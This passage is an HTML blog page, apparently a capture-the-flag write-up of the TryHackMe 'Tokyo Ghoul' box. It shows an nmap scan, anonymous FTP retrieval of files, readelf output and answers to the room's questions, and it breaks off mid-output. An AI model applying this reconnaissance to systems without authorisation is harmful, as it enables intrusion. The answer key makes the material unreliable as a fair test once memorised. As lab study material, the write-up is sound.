@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>THM Writeup - Tokyo Ghoul (Medium) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tokyo Ghoul is a medium difficulty linux box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/tokyo_ghoul/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="THM Writeup - Tokyo Ghoul (Medium)">
+<meta property="og:description" content="Tokyo Ghoul is a medium difficulty linux box." />
+<meta property="og:url" content="/posts/tokyo_ghoul/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/search">search</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/search" >search</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/tokyo_ghoul/">THM Writeup - Tokyo Ghoul (Medium)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-04</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/thm/">thm</a>&nbsp;
+      
+      #<a href="/tags/medium/">medium</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Tokyo Ghoul</code> is a medium difficulty linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a scan with <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV -A 10.10.250.26    
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-02-14 14:49 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.250.26
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.8.21.1
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> need_Help?
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> fa9e38d395df55ea14c949d80a61db5e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> adb7a75e36cb32a090908e0b98308a97 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a2a2c81496c5206885e541d0aa538bbd <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Welcome To Tokyo goul
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>How many ports are open ? <code>3</code>
+What is the OS used ? <code>ubuntu</code>
+Did you find the note that the others ghouls gave you? where did you find it ?<code>jasonroom.html</code></p>
+<h2 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.250.26                                   
+</span></span><span style="display:flex;"><span>Connected to 10.10.250.26.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.250.26:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; ls -all
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|46293|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> need_Help?
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; cd need_Help?
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls -all
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|44357|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">480</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> Aogiri_tree.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> Talk_with_me
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get Aogiri_tree.txt
+</span></span><span style="display:flex;"><span>local: Aogiri_tree.txt remote: Aogiri_tree.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|40621|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> Aogiri_tree.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">480</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************************************************************************************************************************************|   <span style="color:#ae81ff">480</span>        1.26 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">480</span> bytes received in 00:00 <span style="color:#f92672">(</span>9.19 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; cd Talk_with_me
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls -all
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41852|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rwxr-xr-x    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">17488</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> need_to_talk
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">46674</span> Jan <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2021</span> rize_and_kaneki.jpg
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get rize_and_kaneki.jpg
+</span></span><span style="display:flex;"><span>local: rize_and_kaneki.jpg remote: rize_and_kaneki.jpg
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41077|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> rize_and_kaneki.jpg <span style="color:#f92672">(</span><span style="color:#ae81ff">46674</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************************************************************************************************************************************| <span style="color:#ae81ff">46674</span>      392.29 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">46674</span> bytes received in 00:00 <span style="color:#f92672">(</span>265.98 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get need_to_talk
+</span></span><span style="display:flex;"><span>local: need_to_talk remote: need_to_talk
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|49396|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> need_to_talk <span style="color:#f92672">(</span><span style="color:#ae81ff">17488</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************************************************************************************************************************************| <span style="color:#ae81ff">17488</span>      315.42 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17488</span> bytes received in 00:00 <span style="color:#f92672">(</span>155.82 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><p>Now I read all file that I found:</p>
+<p>&ndash;&gt;<code>Aogiri_tree.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Aogiri_tree.txt
+</span></span><span style="display:flex;"><span>Why are you so late?? i<span style="color:#e6db74">&#39;ve been waiting for too long .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">So i heard you need help to defeat Jason , so i&#39;</span>ll help you to <span style="color:#66d9ef">do</span> it and i know you are wondering how i will. 
+</span></span><span style="display:flex;"><span>I knew Rize San more than anyone and she is a part of you, right?
+</span></span><span style="display:flex;"><span>That mean you got her kagune , so you should activate her Kagune and to <span style="color:#66d9ef">do</span> that you should get all control to your body , i<span style="color:#e6db74">&#39;ll help you to know Rise san more and get her kagune , and don&#39;</span>t forget you are now a part of the Aogiri tree .
+</span></span><span style="display:flex;"><span>Bye Kaneki.
+</span></span></code></pre></div><p>&ndash;&gt;<code>need_to_talk</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ readelf -all need_to_talk  
+</span></span><span style="display:flex;"><span>ELF Header:
+</span></span><span style="display:flex;"><span>  Magic:   7f <span style="color:#ae81ff">45</span> 4c <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
+</span></span><span style="display:flex;"><span>  Class:                             ELF64
+</span></span><span style="display:flex;"><span>  Data:                              2<span style="color:#e6db74">&#39;s complement, little endian
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Version:                           1 (current)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  OS/ABI:                            UNIX - System V
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ABI Version:                       0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Type:                              DYN (Position-Independent Executable file)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Machine:                           Advanced Micro Devices X86-64
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Version:                           0x1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Entry point address:               0x10f0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Start of program headers:          64 (bytes into file)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Start of section headers:          15568 (bytes into file)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Flags:                             0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Size of this header:               64 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Size of program headers:           56 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Number of program headers:         11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Size of section headers:           64 (bytes)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Number of section headers:         30
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Section header string table index: 29
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Section Headers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [Nr] Name              Type             Address           Offset
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       Size              EntSize          Flags  Link  Info  Align
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 0]                   NULL             0000000000000000  00000000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000000  0000000000000000           0     0     0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 1] .interp           PROGBITS         00000000000002a8  000002a8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       000000000000001c  0000000000000000   A       0     0     1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 2] .note.gnu.bu[...] NOTE             00000000000002c4  000002c4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000024  0000000000000000   A       0     0     4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 3] .note.ABI-tag     NOTE             00000000000002e8  000002e8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000020  0000000000000000   A       0     0     4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 4] .gnu.hash         GNU_HASH         0000000000000308  00000308
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000030  0000000000000000   A       5     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 5] .dynsym           DYNSYM           0000000000000338  00000338
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       00000000000001c8  0000000000000018   A       6     1     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 6] .dynstr           STRTAB           0000000000000500  00000500
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       00000000000000cc  0000000000000000   A       0     0     1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 7] .gnu.version      VERSYM           00000000000005cc  000005cc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000026  0000000000000002   A       5     0     2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 8] .gnu.version_r    VERNEED          00000000000005f8  000005f8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000020  0000000000000000   A       6     1     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [ 9] .rela.dyn         RELA             0000000000000618  00000618
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000150  0000000000000018   A       5     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [10] .rela.plt         RELA             0000000000000768  00000768
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000108  0000000000000018  AI       5    23     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [11] .init             PROGBITS         0000000000001000  00001000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000017  0000000000000000  AX       0     0     4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [12] .plt              PROGBITS         0000000000001020  00001020
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       00000000000000c0  0000000000000010  AX       0     0     16
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [13] .plt.got          PROGBITS         00000000000010e0  000010e0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000008  0000000000000008  AX       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [14] .text             PROGBITS         00000000000010f0  000010f0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000331  0000000000000000  AX       0     0     16
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [15] .fini             PROGBITS         0000000000001424  00001424
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000009  0000000000000000  AX       0     0     4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [16] .rodata           PROGBITS         0000000000002000  00002000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000150  0000000000000000   A       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [17] .eh_frame_hdr     PROGBITS         0000000000002150  00002150
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       000000000000005c  0000000000000000   A       0     0     4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [18] .eh_frame         PROGBITS         00000000000021b0  000021b0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000188  0000000000000000   A       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [19] .init_array       INIT_ARRAY       0000000000003de8  00002de8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000008  0000000000000008  WA       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [20] .fini_array       FINI_ARRAY       0000000000003df0  00002df0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000008  0000000000000008  WA       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [21] .dynamic          DYNAMIC          0000000000003df8  00002df8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       00000000000001e0  0000000000000010  WA       6     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [22] .got              PROGBITS         0000000000003fd8  00002fd8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000028  0000000000000008  WA       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [23] .got.plt          PROGBITS         0000000000004000  00003000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000070  0000000000000008  WA       0     0     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [24] .data             PROGBITS         0000000000004070  00003070
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000038  0000000000000000  WA       0     0     16
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [25] .bss              NOBITS           00000000000040b0  000030a8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000020  0000000000000000  WA       0     0     16
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [26] .comment          PROGBITS         0000000000000000  000030a8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       000000000000001d  0000000000000001  MS       0     0     1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [27] .symtab           SYMTAB           0000000000000000  000030c8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       00000000000007c8  0000000000000018          28    45     8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [28] .strtab           STRTAB           0000000000000000  00003890
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000334  0000000000000000           0     0     1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  [29] .shstrtab         STRTAB           0000000000000000  00003bc4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       0000000000000107  0000000000000000           0     0     1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Key to Flags:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  L (link order), O (extra OS processing required), G (group), T (TLS),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  C (compressed), x (unknown), o (OS specific), E (exclude),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  D (mbind), l (large), p (processor specific)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">There are no section groups in this file.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Program Headers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Type           Offset             VirtAddr           PhysAddr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 FileSiz            MemSiz              Flags  Align
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000268 0x0000000000000268  R      0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x000000000000001c 0x000000000000001c  R      0x1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000870 0x0000000000000870  R      0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x000000000000042d 0x000000000000042d  R E    0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000338 0x0000000000000338  R      0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x00000000000002c0 0x00000000000002e8  RW     0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x00000000000001e0 0x00000000000001e0  RW     0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x0000000000000044 0x0000000000000044  R      0x4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  GNU_EH_FRAME   0x0000000000002150 0x0000000000002150 0x0000000000002150
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 0x000000000000005c 0x000000000000005c  R      0x4
